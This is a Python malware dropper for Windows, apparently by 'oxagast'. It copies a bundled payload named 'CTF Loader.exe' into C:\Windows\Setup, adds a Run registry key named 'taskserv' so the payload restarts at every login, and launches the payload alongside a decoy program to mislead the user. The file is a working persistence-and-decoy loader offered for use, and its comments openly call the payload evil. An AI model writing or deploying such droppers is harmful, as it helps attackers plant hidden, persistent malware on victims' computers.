# loader spawns off two processes, the payload.py, and your decoy.exe you load it with.
# attempts to install payload so respawns on reboot (simple persistence).
# author: oxagast

import os
import time
import winreg
import shutil
import subprocess
from pathlib import Path

def resource_path(relative_path):                                             # gets path of the "CTF Loader.exe" (the payload) from our unpack
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)                             # returns path

def set_autostart_registry(app_name, key_data=None, autostart: bool = True) -> bool:
    with winreg.OpenKey(                                                      # the key is for autostart on windows login
            key=winreg.HKEY_CURRENT_USER,                                     # current/whatever user is logged in runs
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run', 
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,                                     # make sure we can write a reg key
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)  # sets autostart reg key
            else:
                winreg.DeleteValue(key, app_name)                             # dont leave anything if not available
        except OSError:
            return False
    return True                                                              # confirm we wrote our reg key for win startup

pwnpath = r'C:\Windows\Setup\CTF Loader.exe'                                 # where we will drop our evil payload
ppath = Path(pwnpath)                                                        # turn it into a path obj
if not ppath.is_file():
        shutil.copyfile(resource_path('CTF Loader.exe'), pwnpath)            # put the payload in place
        set_autostart_registry('taskserv', pwnpath)                          # run autostart reg key routine
subprocess.Popen(resource_path('CTF Loader.exe'))                            # run the payload
subprocess.Popen(resource_path('decoy.exe'))                                 # run the decoy


